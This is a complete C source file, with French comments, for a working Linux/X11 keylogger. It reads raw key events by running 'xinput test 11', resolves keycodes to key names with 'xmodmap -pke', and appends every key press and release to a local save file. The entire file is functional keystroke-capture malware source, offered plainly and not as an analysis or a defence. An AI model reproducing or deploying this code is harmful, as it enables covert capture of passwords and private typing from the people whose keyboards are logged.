#include <stdio.h>
#include <stdlib.h>
#include <string.h>



int get_keymap(char keymap[][40]);

int main(){
	
	/* recuperer la correspondance numero-valeur avec xmodmap -pke*/
	FILE *sortie;
	sortie = popen("xinput test 11","r");
	char sortie_xinput[40];
	char keymap[256][40];
	int num;
	FILE *enregistrement;
	enregistrement = fopen("/home/man/Prog/keyloger/save","a");

	if(get_keymap(keymap)==-1){
		perror("Erreur dans la lecture du keymap");
		return (-1);
	}


	if(sortie==NULL){
		perror("Can't launch the command");
		return (-1);
	}
	
	while (fgets(sortie_xinput,40,sortie) != NULL) {
		if(sscanf(sortie_xinput,"key press %d", &num)==1){
			fprintf(enregistrement,"press %s\n",keymap[num]);
		}
		else if (sscanf(sortie_xinput,"key release %d", &num)==1){
			fprintf(enregistrement,"release %s\n", keymap[num]);
			}
			fflush(enregistrement);
	}
	fclose(enregistrement);
	pclose(sortie);
	return 0;
}

int get_keymap(char keymap[][40]){/* keymap[i]="string"*/
	FILE *map;
	map=popen("xmodmap -pke","r");
	int num;
	char attente[40];
	char attent[40];

	if(map==NULL){
		perror("Can't launch the command");
		return (-1);
	}
	
	while (fgets(attente,40,map)!=NULL) {
		if (sscanf(attente,"keycode %d = %s",&num,attent)>=1 && num<256 && num>0){
			printf("%d %s\n",num,attent);
			strcpy(*(keymap+num),attent);
		}
	}
	pclose(map);
	return 0;
}